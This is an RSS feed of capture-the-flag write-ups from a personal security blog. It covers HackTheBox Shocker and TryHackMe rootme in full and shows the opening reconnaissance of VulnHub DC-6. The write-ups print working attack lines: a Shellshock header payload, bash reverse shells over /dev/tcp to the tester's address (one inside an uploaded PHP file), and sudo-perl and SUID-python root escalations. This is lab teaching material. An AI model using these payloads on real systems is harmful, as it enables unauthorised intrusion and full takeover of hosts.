<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>GTFOBins on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/gtfobins/</link>
    <description>Recent content in GTFOBins on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Tue, 13 Jul 2021 11:30:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/gtfobins/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Shocker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
      <description>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of Shellshock vulnerability</li>
<li>Exploitation of sudo privileges on perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
Nmap scan report <span class="k">for</span> 10.10.10.56
Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The site serves only one a text and an image.</p>
<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
</p>
<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -I http://10.10.10.56
HTTP/1.1 <span class="m">200</span> OK
Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
Accept-Ranges: bytes
Content-Length: <span class="m">137</span>
Vary: Accept-Encoding
Content-Type: text/html
</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -s http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime <span class="nb">test</span> script

 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shelly">Shell as shelly</h3>
<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
<p>The following is the commonly used PoC for shellshock.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
</p>
<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
</p>
<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
</p>
<p>The following bash reverse shell works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
script /dev/null -c bash
Script started, file is /dev/null
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «shocker» «10.10.14.83» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>

shelly@Shocker:/usr/lib/cgi-bin$  
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
total <span class="m">8</span>
drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
-r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
shelly@Shocker:/home/shelly$ cat user.txt 
7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> shelly on Shocker:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User shelly may run the following commands on Shocker:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
Shocker
root@Shocker:/home/shelly#
</code></pre></div><p>The root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="extras">Extras</h2>
<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
</p>
<p>The full response</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
Date: Sun, 11 Jul 2021 03:06:31 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 1113

iamf
test
SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;

HTTP_USER_AGENT=Blackhole
SERVER_PORT=80
HTTP_HOST=10.10.10.56
DOCUMENT_ROOT=/var/www/html
SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
REQUEST_URI=/cgi-bin/iamf.sh
SCRIPT_NAME=/cgi-bin/iamf.sh
HTTP_CONNECTION=close
REMOTE_PORT=58222
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
CONTEXT_PREFIX=/cgi-bin/
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
REQUEST_SCHEME=http
HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
REMOTE_ADDR=10.10.14.83
SHLVL=1
SERVER_NAME=10.10.10.56
CONTENT_LENGTH=0
SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
QUERY_STRING=
SERVER_ADDR=10.10.10.56
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.1
HTTP_CACHE_CONTROL=max-age=0
HTTP_ACCEPT_ENCODING=gzip, deflate
REQUEST_METHOD=GET
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
HTTP_IAMF_HEADER=() {  :
}
_=/usr/bin/env
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - rootme</title>
      <link>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</link>
      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</guid>
      <description>A ctf for beginners, can you root me?</description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools:</strong>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
</ul>
</li>
<li><strong>Skills Learned</strong>:
<ul>
<li>Web enumeration</li>
<li>SUID exploitation</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 23:35 EDT
Nmap scan report <span class="k">for</span> 10.10.215.165
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.26s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
Reason: <span class="m">65533</span> resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
80/tcp open  http    syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 96.24 seconds
</code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.215.165/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/29 23:37:44 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/js/<span class="o">]</span>
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/css/<span class="o">]</span>
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/uploads/<span class="o">]</span>
/panel                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/panel/<span class="o">]</span>  
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>                 
<span class="o">===============================================================</span>
2021/05/29 23:43:21 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><h4 id="panel">/panel</h4>
<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
<p><img class="img-container" src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
<p><img class="img-container" src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  />
</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115»  
$ cat iamf.phtml    
&lt;?php
system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
</code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
<p><img class="img-container" src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  />
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@rootme:/var/www/html$ which python
which python
/usr/bin/python
www-data@rootme:/var/www/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@rootme:/var/www/html$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
bash-4.4$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> suspended  nc -nvlp <span class="m">443</span>
→ root@kali «rootme» «10.9.30.115» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> continued  nc -nvlp <span class="m">443</span>

bash-4.4$ 
</code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span>
...
/var/www/user.txt
...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<p>I find out the current Python binary has SUID bit set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;snap&#39;</span>
...
/usr/bin/python
...
</code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
bash-4.4# id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  />
</p>
<p>I can grab the root flag now.</p>
<p><img class="img-container" src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - DC-6</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>WordPress enumeration and plugin exploitation</li>
<li>Exploiting sudo privileges on nmap</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>WPScan</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ arp-scan --interface eth0 <span class="s1">&#39;192.168.2.0/24&#39;</span> <span class="p">|</span> tee scans/00-arp-scan-dc6
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
192.168.2.2     0a:00:27:00:00:07       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
</code></pre></div><h3 id="nmap">Nmap</h3>
<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span class="s1">&#39;192.168.2.104&#39;</span> -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Did not follow redirect to http://wordy/
<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
